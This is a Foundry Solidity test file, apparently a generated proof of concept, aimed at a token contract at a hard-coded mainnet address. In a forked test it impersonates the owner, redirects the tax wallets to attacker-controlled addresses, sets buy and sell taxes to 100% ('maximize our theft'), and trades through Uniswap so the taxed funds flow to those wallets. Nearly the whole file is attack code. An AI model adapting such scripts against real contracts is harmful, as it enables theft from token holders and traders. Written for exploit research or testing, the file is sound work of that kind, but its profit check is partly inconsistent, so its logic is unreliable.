// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interfaces needed
interface ICoinToken {
    function owner() external view returns (address);
    function setTaxWallets(address dev, address marketing, address charity) external;
    function setBuyTax(uint256 dev, uint256 marketing, uint256 liquidity, uint256 charity) external;
    function setSellTax(uint256 dev, uint256 marketing, uint256 liquidity, uint256 charity) external;
    function uniswapV2Router02() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    // Just need the address
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF9881a0Bf01b1ec048506A188B06d48808087657;
    address attacker = address(this);
    // Attacker-controlled tax wallet addresses
    address internal attackerDevWallet;
    address internal attackerMarketingWallet;
    address internal attackerCharityWallet;
    address internal owner; // Added to store owner address

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to create attacker-controlled addresses for tax wallets
        attackerDevWallet = address(0x111);
        attackerMarketingWallet = address(0x222);
        attackerCharityWallet = address(0x333);

        // Label addresses for clarity
        vm.label(attackerDevWallet, "AttackerDevWallet");
        vm.label(attackerMarketingWallet, "AttackerMarketingWallet");
        vm.label(attackerCharityWallet, "AttackerCharityWallet");

        // Get the contract owner
        owner = ICoinToken(TARGET).owner();
        vm.label(owner, "ContractOwner");

        // Give attacker some ETH for trading
        deal(attacker, 100 ether);

        // Give attacker some WETH for token purchases
        address weth = IUniswapV2Router02(ICoinToken(TARGET).uniswapV2Router02()).WETH();
        deal(weth, attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate the owner
        vm.startPrank(owner);

        // Step 2: Set tax wallets to attacker-controlled addresses
        ICoinToken(TARGET).setTaxWallets(attackerDevWallet, attackerMarketingWallet, attackerCharityWallet);

        // Step 3: Set high tax rates (25% each for dev, marketing, liquidity, charity)
        // Total 100% tax - this will maximize our theft
        ICoinToken(TARGET).setBuyTax(25, 25, 25, 25);
        ICoinToken(TARGET).setSellTax(25, 25, 25, 25);

        vm.stopPrank();

        // Step 4: Prepare for trading
        // Get router and WETH addresses
        IUniswapV2Router02 router = IUniswapV2Router02(ICoinToken(TARGET).uniswapV2Router02());
        address weth = router.WETH();
        address pair = ICoinToken(TARGET).uniswapV2Pair();

        // Approve router to spend WETH
        IERC20(weth).approve(address(router), type(uint256).max);

        // Step 5: Buy tokens to trigger buy tax
        // We'll buy with 10 ETH worth of WETH
        uint256 buyAmount = 10 ether;
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // Record initial balances for verification
        uint256 initialDevBalance = attackerDevWallet.balance;
        uint256 initialMarketingBalance = attackerMarketingWallet.balance;
        uint256 initialCharityBalance = attackerCharityWallet.balance;

        // Execute swap
        router.swapExactTokensForTokens(
            buyAmount,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 6: Sell tokens to trigger sell tax processing
        // Get token balance
        uint256 tokenBalance = ICoinToken(TARGET).balanceOf(attacker);
        // Approve router to spend tokens
        ICoinToken(TARGET).approve(address(router), tokenBalance);

        // Reverse path for selling
        path[0] = TARGET;
        path[1] = weth;

        // Execute sell
        router.swapExactTokensForTokens(
            tokenBalance,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 7: Check that tax wallets received ETH
        uint256 finalDevBalance = attackerDevWallet.balance;
        uint256 finalMarketingBalance = attackerMarketingWallet.balance;
        uint256 finalCharityBalance = attackerCharityWallet.balance;

        // Verify profit - at least one wallet should have received ETH
        assertGt(finalDevBalance + finalMarketingBalance + finalCharityBalance, 
                 initialDevBalance + initialMarketingBalance + initialCharityBalance, 
                 "Tax wallets should have received ETH");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
